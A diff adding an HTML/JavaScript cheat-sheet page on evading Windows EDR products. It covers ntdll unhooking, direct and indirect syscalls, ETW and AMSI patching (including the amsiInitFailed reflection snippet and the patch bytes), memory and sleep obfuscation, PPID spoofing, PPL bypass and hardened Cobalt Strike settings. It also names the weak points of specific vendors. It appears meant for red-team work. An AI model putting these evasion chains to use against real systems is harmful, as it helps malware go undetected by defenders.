@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Evasion & Defense Bypass Reference</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
+.mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}
+.off{color:#ef4444;font-weight:600;font-size:.82em}
+.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}
+.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#ef4444,#f59e0b,#fbbf24);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hd .sub{font-size:.62em;color:#374151}
+.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}
+.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}
+.sb.on{background:#111318}
+.sb[data-sc="kit"],.sb[data-sc="byp"]{border-left:2px solid #ffffff15;margin-left:4px}
+.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}
+.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}
+.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}
+.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}
+.ct{padding:10px 14px;overflow-x:auto}
+.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}
+.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}
+.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}
+.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}
+.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}
+.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}
+.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}
+.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}
+.bx-b{padding:6px 10px}
+.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}
+.fd.hl{background:#ffffff08;border-radius:3px;padding:2px 4px}
+.fd .tp{color:#6b7280;font-size:.82em}
+.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}
+.tg-s{padding:0 5px;font-size:.68em}
+.nt{margin:6px 0;padding:7px 10px;border-radius:6px}
+.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}
+.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}
+.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}
+.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}
+.ct2:hover{background:#111827}
+.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}
+.cv.op{transform:rotate(90deg)}
+.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}
+.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}
+.cb .cm{color:#4b5563}
+.cb .pp{color:#f59e0b}
+.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}
+.ti.op{border-color:#f9731640;background:#f9731608}
+.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}
+.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}
+.ti.op .tn{color:#fdba74}
+.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}
+.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}
+.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}
+.dt{width:6px;height:6px;border-radius:2px;display:inline-block}
+.grd{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+var $=function(s){return document.querySelector(s)};
+var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+var SE=[
+{id:"edr",l:"A. EDR Internals",i:"\u{1F50D}",c:"#f87171"},
+{id:"uhk",l:"B. Unhooking",i:"\u{1F504}",c:"#60a5fa"},
+{id:"sys",l:"C. Syscalls",i:"\u{1F4BB}",c:"#a78bfa"},
+{id:"etw",l:"D. ETW Bypass",i:"\u{1F4CA}",c:"#fbbf24"},
+{id:"ams",l:"E. AMSI / Script",i:"\u{1F6E1}\uFE0F",c:"#34d399"},
+{id:"mem",l:"F. Memory Evasion",i:"\u{1F9E0}",c:"#e879f9"},
+{id:"prc",l:"G. Process / Thread",i:"\u2699\uFE0F",c:"#f59e0b"},
+{id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
+{id:"byp",l:"I. Full Chains",i:"\u{1F525}",c:"#fb923c"}
+];
+var S={s:'edr',t:'flow'};
+function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
+function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
+function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
+function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
+function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
+function CRD(icon,title,color,body){return '<div style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
+function fEDR(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">EDR DETECTION ARCHITECTURE</div>';
+h+='<div class="fr">';
+h+=B("Usermode Hooks","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Inline hooks on ntdll.dll exports","")+F("","JMP to EDR DLL at function prologue","")+F("","Inspects arguments before real syscall","")+F("","NtAllocateVirtualMemory, NtWriteVirtualMemory","")+F("","NtCreateThreadEx, NtProtectVirtualMemory","")+'</div>',240);
+h+=A("telemetry");
+h+=B("ETW Providers","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Microsoft-Windows-Threat-Intelligence","")+F("","Microsoft-Windows-DotNETRuntime","")+F("","Microsoft-Windows-PowerShell","")+F("","Kernel-level ETW (cannot patch from usermode)","")+F("","Feeds AMSI, script logging, .NET telemetry","")+'</div>',260);
+h+=A("telemetry");
+h+=B("Kernel Callbacks","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","PsSetCreateProcessNotifyRoutine","")+F("","PsSetCreateThreadNotifyRoutine","")+F("","PsSetLoadImageNotifyRoutine","")+F("","ObRegisterCallbacks (handle operations)","")+F("","CmRegisterCallbackEx (registry)","")+F("","Cannot bypass from usermode","")+'</div>',260);
+h+='</div>';
+h+='<div class="grd" style="margin-top:8px">';
+h+=CRD("\u{1F4E6}","Minifilter Drivers","#f87171",
+F("","File system filter: monitors all file I/O","")+F("","IRP_MJ_CREATE, IRP_MJ_WRITE interception","")+F("","Detects payload drops to disk","")+F("","Altitude-based ordering (EDR = high priority)","")+F("","fltMC.exe to enumerate loaded minifilters",""));
+h+=CRD("\u{1F4CA}","AMSI (Antimalware Scan Interface)","#f87171",
+F("","Scans scripts before execution","")+F("","PowerShell, VBScript, JScript, VBA, .NET","")+F("","amsi.dll loaded into every script host","")+F("","AmsiScanBuffer / AmsiScanString entry points","")+F("","Cloud-based signature + ML analysis",""));
+h+=CRD("\u{1F9EC}","Behavioral Analysis","#f87171",
+F("","Process tree: parent-child relationships","")+F("","API call sequences (injection patterns)","")+F("","Memory allocation patterns (RWX, private)","")+F("","Network connections post-execution","")+F("","File/registry access correlations",""));
+h+='</div>';
+h+=N("KEY INSIGHT","#f87171","EDR has 4 telemetry sources: <b>usermode hooks</b> (bypassable), <b>ETW</b> (partially bypassable), <b>kernel callbacks</b> (not bypassable from usermode), <b>minifilters</b> (not bypassable from usermode). Full evasion requires addressing all four.");
+return h;
+}
+
+function fUHK(){
+var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">UNHOOKING TECHNIQUES</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4CB}","Full ntdll Remap (KnownDlls)","#60a5fa",
+F("","NtOpenSection(\\\\KnownDlls\\\\ntdll.dll)","")+F("","Map clean copy into process","")+F("","Overwrite .text of hooked ntdll","")+F("","All hooks removed in one operation","")+
+'<div style="font-size:.88em;color:#f59e0b;margin-top:4px">\u26A0 Detectable: ntdll .text becomes private memory (not image-backed).</div>');
+h+=CRD("\u{1F4C1}","ntdll from Disk","#60a5fa",
+F("","Read C:\\\\Windows\\\\System32\\\\ntdll.dll","")+F("","Map as SEC_IMAGE or manual parse","")+F("","Overwrite hooked .text section","")+F("","File read may be monitored by minifilter",""));
+h+=CRD("\u{1F47B}","ntdll from Suspended Process","#60a5fa",
+F("","Create suspended process (notepad.exe)","")+F("","EDR hasn't hooked it yet","")+F("","Read ntdll from suspended process memory","")+F("","Terminate suspended process","")+F("","Fresh hooks not yet applied at suspension point",""));
+h+=CRD("\u{1F527}","Selective Unhooking","#60a5fa",
+F("","Only patch functions you need","")+F("","Restore original bytes (MOV R10,RCX; MOV EAX,SSN)","")+F("","Smaller footprint than full remap","")+F("","Check: first bytes == 4C 8B D1 B8 (clean)","")+F("","If E9 or FF 25: function is hooked",""));
+h+=CRD("\u{1F504}","Perun's Fart / Syscall Stub Copy","#60a5fa",
+F("","Copy only the syscall stub from clean ntdll","")+F("","Don't remap entire .text","")+F("","Read 32 bytes per function: enough for stub","")+F("","Tiny memory footprint","")+F("","Build local syscall table from clean stubs",""));
+h+=CRD("\u{1F50D}","Hook Detection","#60a5fa",
+F("","Compare ntdll .text with on-disk copy","")+F("","Check function prologues for JMP (E9/FF25)","")+F("","Enumerate hooked functions to understand EDR coverage","")+F("","HookDetector, HollowsHunter, pe-sieve",""));
+h+='</div>';return h;
+}
+
+function fSYS(){
+var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">SYSCALL TECHNIQUES</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4BB}","Direct Syscalls","#a78bfa",
+F("","MOV R10, RCX; MOV EAX, SSN; syscall; ret","")+F("","Execute syscall instruction in your own code","")+F("","Skips ntdll entirely (no hooks hit)","")+F("","Need correct SSN per OS build","")+
+'<div style="font-size:.88em;color:#f59e0b;margin-top:4px">\u26A0 syscall instruction not in ntdll = anomalous return address. Detectable.</div>');
+h+=CRD("\u{1F500}","Indirect Syscalls","#a78bfa",
+F("","Set up args + SSN, JMP to syscall;ret in ntdll","")+F("","Return address is inside ntdll (legitimate)","")+F("","Find gadget: syscall; ret at known offsets","")+F("","Passes stack/return address validation","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Gold standard. Return address in ntdll. Passes call stack checks.</div>');
+h+=CRD("\u{1F50D}","SSN Resolution: Hell\'s Gate","#a78bfa",
+F("","Read SSN from ntdll in memory","")+F("","Even if hooked: SSN is at known offset","")+F("","Check function prologue: 4C 8B D1 B8 XX 00 00 00","")+F("","XX = syscall number","")+F("","If first bytes are JMP (hooked), look nearby",""));
+h+=CRD("\u{1F47B}","Halo\'s Gate","#a78bfa",
+F("","Hell's Gate + neighbor resolution","")+F("","If function is hooked, look at neighbor stubs","")+F("","SSNs are sequential: if NtOpenProcess=0x26, neighbor is 0x25 or 0x27","")+F("","Walk up/down function table to find unhooked stub","")+F("","Calculate target SSN from offset",""));
+h+=CRD("\u{1F3B2}","Tartarus Gate / SysWhispers3","#a78bfa",
+F("","Handle multiple hook types (jmp, push/ret, etc.)","")+F("","Sort exports by address to get SSN order","")+F("","SSN = position in sorted Zw* export list","")+F("","Random syscall;ret gadget selection per call","")+F("","Jitter in gadget selection avoids pattern matching",""));
+h+=CRD("\u{1F4CA}","SSN Reference","#a78bfa",
+F("0x18","NtAllocateVirtualMemory","Win10 21H2")+F("0x3F","NtProtectVirtualMemory","Win10 21H2")+F("0x50","NtWriteVirtualMemory","Win10 21H2")+F("0xC1","NtCreateThreadEx","Win10 21H2")+F("0x55","NtCreateSection","Win10 21H2")+F("0x28","NtMapViewOfSection","Win10 21H2")+
+'<div style="font-size:.82em;color:#6b7280;margin-top:4px">SSNs vary by build. Always resolve dynamically.</div>');
+h+='</div>';return h;
+}
+
+function fETW(){
+var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">ETW BYPASS TECHNIQUES</div>';
+h+='<div class="fr">';
+h+=B("ETW Architecture","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Provider: generates events (ntdll, CLR, PS)","")+F("","Session: collects from providers","")+F("","Consumer: processes events (EDR, EventLog)","")+F("","Kernel providers: unpatchable from usermode","")+F("","Usermode providers: patchable","")+'</div>',260);
+h+=A("patch");
+h+=B("Bypass Targets","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","ntdll!EtwEventWrite (general ETW)","")+F("","ntdll!EtwNotificationRegister","")+F("","Provider-specific disable","")+F("","Session handle manipulation","")+F("","Consumer starvation","")+'</div>',220);
+h+='</div>';
+h+='<div class="grd" style="margin-top:8px">';
+h+=CRD("\u{1F4CA}","Patch EtwEventWrite","#fbbf24",
+F("","xor eax,eax; ret (0x33C0C3) at function start","")+F("","All usermode ETW events silenced","")+F("","Kernel ETW unaffected","")+F("","Must patch BEFORE payload execution","")+F("","Re-patch after operation (optional)",""));
+h+=CRD("\u{1F50D}","Kernel ETW (Threat Intelligence)","#fbbf24",
+F("","EtwTi: kernel-level threat intelligence provider","")+F("","Fires on: VirtualAlloc with exec, thread injection, etc.","")+F("","CANNOT be patched from usermode","")+F("","Requires kernel driver to disable","")+F("","Best strategy: avoid triggering the events",""));
+h+=CRD("\u{1F4BB}",".NET ETW (CLR Provider)","#fbbf24",
+F("","Microsoft-Windows-DotNETRuntime","")+F("","Logs assembly loads, method JIT, etc.","")+F("","Patch clr.dll ETW calls","")+F("","Or: patch EtwEventWrite before CLR init","")+F("","Assembly.Load(byte[]) generates events",""));
+h+=CRD("\u{1F6E1}\uFE0F","Provider-Specific Disable","#fbbf24",
+F("","Set provider EnableLevel to 0","")+F("","Modify provider registration structure","")+F("","Unregister specific provider GUID","")+F("","Target: only disable providers EDR consumes","")+F("","More surgical than blanket EtwEventWrite patch",""));
+h+='</div>';return h;
+}
+
+function fAMS(){
+var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">AMSI & SCRIPT BYPASS</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F6E1}\uFE0F","AmsiScanBuffer Patch","#34d399",
+F("","Patch AmsiScanBuffer to return E_INVALIDARG","")+F("","mov eax, 0x80070057; ret (6 bytes)","")+F("","All subsequent script scans return clean","")+F("","Must patch BEFORE malicious script runs","")+F("","amsi.dll loaded in: powershell, wscript, cscript, msbuild",""));
+h+=CRD("\u{1F4BB}","AmsiOpenSession Patch","#34d399",
+F("","Alternative to AmsiScanBuffer","")+F("","Patch session initialization to fail","")+F("","No valid session = no scanning","")+F("","Fewer detection signatures than ScanBuffer",""));
+h+=CRD("\u{1F527}",".NET amsiInitFailed","#34d399",
+F("","Reflection: set amsiInitFailed = true","")+F("","[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')","")+F("",".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)","")+F("","AMSI thinks initialization failed = skip scanning","")+F("","Heavily signatured, requires obfuscation",""));
+h+=CRD("\u{1F3AD}","Obfuscation Techniques","#34d399",
+F("","String splitting: 'Am'+'si'+'Ut'+'ils'","")+F("","Variable substitution: $a='AmsiUtils'; [Ref]...","")+F("","Encoding: Base64 + IEX","")+F("","Reflection: invoke via .NET reflection APIs","")+F("","Runtime assembly patching vs string-based",""));
+h+=CRD("\u{1F4DC}","VBA / Office AMSI","#34d399",
+F("","Office 365 sends VBA to AMSI before execution","")+F("","VBA stomping: remove p-code, keep only source","")+F("","Or: trigger AMSI bypass from VBA before payload","")+F("","Excel 4.0 macros: no AMSI (legacy engine)","")+F("","Template injection: remote template fetch",""));
+h+=CRD("\u{1F310}","WMI / JScript AMSI","#34d399",
+F("","wscript.exe / cscript.exe: JScript AMSI","")+F("","wmic.exe: XSL AMSI scanning","")+F("","AMSI in each host process independently","")+F("","Patch in target process before execution","")+F("","DotNetToJScript: .NET in JScript (AMSI aware)",""));
+h+='</div>';return h;
+}
+function fMEM(){
+var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">MEMORY EVASION</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4A4}","Sleep Obfuscation","#e879f9",
+F("","Encrypt payload in memory during sleep","")+F("","Change permissions: RX \u2192 RW (non-executable)","")+F("","Timer/APC-based automatic decrypt \u2192 execute \u2192 re-encrypt","")+F("","Ekko: ROP chain with timers","")+F("","Foliage: APC-based with NtContinue","")+F("","Cronos: threadpool-based sleep obfuscation",""));
+h+=CRD("\u{1F9F1}","Module Stomping / Overloading","#e879f9",
+F("","Load legitimate DLL, overwrite its .text with payload","")+F("","Memory is image-backed (not private MEM_COMMIT)","")+F("","DLL backup: map, stomp, restore on exit","")+F("","Phantom DLL hollowing: DLL from disk never loaded legit","")+F("","Choose DLL: same size or larger than payload",""));
+h+=CRD("\u{1F4CB}","PE Header Wiping","#e879f9",
+F("","Zero MZ header after manual mapping","")+F("","Remove import table, export table","")+F("","Wipe section headers","")+F("","Prevents memory scanner from identifying PE","")+F("","Also wipe Rich header + debug directory",""));
+h+=CRD("\u{1F510}","Heap Encryption","#e879f9",
+F("","Encrypt heap allocations containing sensitive data","")+F("","Strings, configs, C2 URLs in cleartext on heap","")+F("","SystemFunction032/033 for RC4 encryption","")+F("","Encrypt before sleep, decrypt on wake","")+F("","RtlEncryptMemory for user-mode heap encryption",""));
+h+=CRD("\u{1F3AF}","Stack Spoofing","#e879f9",
+F("","Spoof thread call stack during sleep","")+F("","Real stack reveals: beacon \u2192 sleep \u2192 ntdll","")+F("","Replace with: legitimate_dll \u2192 kernel32 \u2192 ntdll","")+F("","ThreadStackSpoofer: modify RBP chain","")+F("","CallStackMasker: synthetic stack frames",""));
+h+=CRD("\u{1F4CA}","Memory Scan Evasion Summary","#e879f9",
+F("","Private RWX memory: \u274C always flagged","")+F("","Private RX: \u26A0 suspicious without image backing","")+F("","Image-backed RX: \u2705 legitimate looking","")+F("","Stomped module: \u2705 image-backed but content differs","")+F("","Encrypted during sleep: \u2705 RW blob, no exec signature",""));
+h+='</div>';return h;
+}
+
+function fPRC(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">PROCESS & THREAD PROTECTIONS</div>';
+h+='<div class="grd">';
+h+=CRD("\u2699\uFE0F","PPID Spoofing","#f59e0b",
+F("","Fake parent process for spawned child","")+F("","PROC_THREAD_ATTRIBUTE_PARENT_PROCESS","")+F("","UpdateProcThreadAttribute in STARTUPINFOEX","")+F("","Spawn svchost with parent services.exe","")+F("","Defeats process tree analysis",""));
+h+=CRD("\u{1F6AB}","BlockDLLs (CIG)","#f59e0b",
+F("","PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY","")+F("","PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON","")+F("","Prevents non-Microsoft DLLs from loading","")+F("","Blocks EDR DLL injection into child process","")+F("","EDR can't hook a process it can't inject into",""));
+h+=CRD("\u{1F512}","ACG (Arbitrary Code Guard)","#f59e0b",
+F("","Prevents dynamic code generation","")+F("","No RWX memory, no W\u2192X transitions","")+F("","SetProcessMitigationPolicy + ProcessDynamicCodePolicy","")+F("","Breaks: JIT, shellcode, reflective loading","")+F("","Use for sacrificial processes (blocks EDR JIT analysis)",""));
+h+=CRD("\u{1F3AF}","CFG (Control Flow Guard)","#f59e0b",
+F("","Validates indirect call targets","")+F("","Call target must be in CFG bitmap","")+F("","SetProcessValidCallTargets to register targets","")+F("","Bypass: overwrite CFG bitmap","")+F("","Or: use already-registered targets (ROP-like)",""));
+h+=CRD("\u{1F6E1}\uFE0F","PPL (Protected Process Light)","#f59e0b",
+F("","Kernel-enforced process protection","")+F("","LSASS as PPL: blocks handle opening","")+F("","Bypass: vulnerable driver (PPLFault, mimidrv.sys)","")+F("","Or: PPLdump (exploit PPL implementation)","")+F("","Cannot bypass from usermode without driver",""));
+h+=CRD("\u{1F4BB}","Process Hollowing & Ghosting","#f59e0b",
+F("","Hollowing: create suspended \u2192 unmap \u2192 inject \u2192 resume","")+F("","Ghosting: delete file before mapping \u2192 minifilter can't scan","")+F("","Herpaderping: overwrite file after mapping \u2192 wrong scan","")+F("","Doppelganging: NTFS transaction \u2192 rollback after mapping","")+F("","Each defeats different detection mechanism",""));
+h+='</div>';return h;
+}
+
+function fKIT(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">DETECTION SURFACE MATRIX</div>';
+h+='<div class="grd" style="margin-bottom:10px">';
+var matrix=[
+{tech:"CreateRemoteThread injection",hooks:"\u274C",etw:"\u274C",kernel:"\u274C",mem:"\u274C",c:"#f87171"},
+{tech:"APC injection",hooks:"\u26A0",etw:"\u274C",kernel:"\u274C",mem:"\u26A0",c:"#f59e0b"},
+{tech:"Syscall + indirect + stomp",hooks:"\u2705",etw:"\u26A0",kernel:"\u274C",mem:"\u2705",c:"#34d399"},
+{tech:"Full chain (below)",hooks:"\u2705",etw:"\u2705",kernel:"\u26A0",mem:"\u2705",c:"#34d399"},
+{tech:"Manual map (private memory)",hooks:"\u2705",etw:"\u2705",kernel:"\u274C",mem:"\u274C",c:"#f59e0b"},
+{tech:"Module stomping",hooks:"\u2705",etw:"\u2705",kernel:"\u274C",mem:"\u2705",c:"#34d399"},
+{tech:"Direct syscall (no indirect)",hooks:"\u2705",etw:"\u26A0",kernel:"\u274C",mem:"\u26A0",c:"#f59e0b"}
+];
+h+='<div style="overflow-x:auto"><table style="width:100%;font-size:.7em;border-collapse:collapse">';
+h+='<tr style="color:#6b7280"><th style="text-align:left;padding:4px 8px">Technique</th><th style="padding:4px">Hooks</th><th style="padding:4px">ETW</th><th style="padding:4px">Kernel</th><th style="padding:4px">Memory</th></tr>';
+matrix.forEach(function(r){
+h+='<tr style="border-top:1px solid #1f2937"><td style="padding:4px 8px;color:'+r.c+'">'+r.tech+'</td><td style="padding:4px;text-align:center">'+r.hooks+'</td><td style="padding:4px;text-align:center">'+r.etw+'</td><td style="padding:4px;text-align:center">'+r.kernel+'</td><td style="padding:4px;text-align:center">'+r.mem+'</td></tr>';
+});
+h+='</table><div style="font-size:.6em;color:#4b5563;margin-top:4px">\u2705 = evades, \u26A0 = partial, \u274C = detected</div></div>';
+h+='</div>';
+h+='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin:6px 0">EDR-SPECIFIC NOTES</div>';
+h+='<div class="grd">';
+var edrs=[
+{n:"CrowdStrike Falcon",d:"Heavy kernel telemetry (callbacks + ETW). Strong behavioral AI. Usermode hooks lighter. Kernel ETW hard to evade.",c:"#f87171"},
+{n:"SentinelOne",d:"Deep usermode hooking. Static + behavioral AI. DLL injection into processes. BlockDLLs effective against it.",c:"#60a5fa"},
+{n:"Microsoft Defender",d:"AMSI + SmartScreen + cloud ML. ETW-based telemetry. Kernel-level on Windows 11. AMSI bypass critical first step.",c:"#34d399"},
+{n:"Carbon Black",d:"Process tree analysis + command-line logging. Behavioral rules. Less kernel presence than CrowdStrike.",c:"#a78bfa"},
+{n:"Elastic EDR",d:"Open detection rules. Sysmon-like telemetry. YARA in-memory scanning. Rules publicly auditable for evasion.",c:"#fbbf24"}
+];
+edrs.forEach(function(e){
+h+='<div style="border-radius:6px;border:1px solid '+e.c+'20;background:'+e.c+'06;padding:5px 8px"><div style="font-weight:700;color:'+e.c+';font-size:.72em">'+e.n+'</div><div style="font-size:.68em;color:#9ca3af;margin-top:1px">'+e.d+'</div></div>';
+});
+h+='</div>';
+return h;
+}
+
+function fBYP(){
+var h='<div style="font-size:.72em;font-weight:800;color:#fb923c;letter-spacing:.06em;margin-bottom:6px">FULL EVASION CHAINS</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F525}","Gold Standard Chain","#fb923c",
+F("1.","ETW patch: blind usermode telemetry","")+F("2.","AMSI patch: disable script scanning","")+F("3.","Indirect syscalls: bypass usermode hooks","")+F("4.","Module stomping: image-backed memory","")+F("5.","Sleep obfuscation: encrypted during idle","")+F("6.","Stack spoofing: clean call stack","")+F("7.","PPID spoof + BlockDLLs on children","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Addresses hooks, ETW, AMSI, memory scanning, behavioral analysis, and process tree.</div>');
+h+=CRD("\u{1F6E1}\uFE0F","Minimal Chain (Speed over Stealth)","#fb923c",
+F("1.","ETW + AMSI patch combo","")+F("2.","Direct syscalls for injection","")+F("3.","In-memory execution (no disk)","")+F("4.","Basic sleep delay between operations",""));
+h+=CRD("\u{1F3AF}","Anti-Defender Specific","#fb923c",
+F("1.","AMSI bypass (critical: Defender relies heavily on AMSI)","")+F("2.","SmartScreen bypass: MOTW removal (ISO/VHD container)","")+F("3.","Cloud sample submission delay (first-seen evasion)","")+F("4.","ETW patch to blind .NET CLR telemetry","")+F("5.","Signed binary proxy execution (LOLBin)",""));
+h+=CRD("\u{1F504}","Cobalt Strike Hardened Profile","#fb923c",
+F("","set host_stage false (no staging = no scan)","")+F("","set userwx false (RW then RX, not RWX)","")+F("","set cleanup true (wipe shellcode after load)","")+F("","set sleep_mask true (encrypted during sleep)","")+F("","set.syscall_method indirect","")+F("","transform-x64 { prepend... } (code mutation)","")+F("","post-ex: spawnto, blockdlls, ppid",""));
+h+=CRD("\u{1F9EC}","Detection Evasion Test Methodology","#fb923c",
+F("1.","Test against specific target EDR in lab","")+F("2.","Start with stock payload \u2192 identify detections","")+F("3.","Address detections one layer at a time","")+F("4.","Hooks \u2192 ETW \u2192 AMSI \u2192 memory \u2192 behavioral","")+F("5.","Validate: process injection + C2 callback + lateral movement","")+F("6.","Never test on VirusTotal (public!)",""));
+h+='</div>';return h;
+}
+function getCodes(s){
+var C={};
+C.edr=[
+{t:"Detect hooks on ntdll exports",l:"c",c:"void DetectHooks(void) {\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)\n        ((PBYTE)hNtdll + ((PIMAGE_DOS_HEADER)hNtdll)->e_lfanew);\n    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)\n        ((PBYTE)hNtdll + nt->OptionalHeader.DataDirectory[0].VirtualAddress);\n    PDWORD names = (PDWORD)((PBYTE)hNtdll + exp->AddressOfNames);\n    PDWORD funcs = (PDWORD)((PBYTE)hNtdll + exp->AddressOfFunctions);\n    PWORD ords = (PWORD)((PBYTE)hNtdll + exp->AddressOfNameOrdinals);\n\n    for (DWORD i = 0; i < exp->NumberOfNames; i++) {\n        char* name = (char*)((PBYTE)hNtdll + names[i]);\n        if (name[0]=='N' && name[1]=='t') {\n            PBYTE func = (PBYTE)hNtdll + funcs[ords[i]];\n            // Clean stub: 4C 8B D1 (mov r10, rcx)\n            // Hooked: E9 (jmp) or FF 25 (jmp qword)\n            if (func[0] == 0xE9 || func[0] == 0xFF) {\n                printf(\"HOOKED: %s\\n\", name);\n            }\n        }\n    }\n}"},
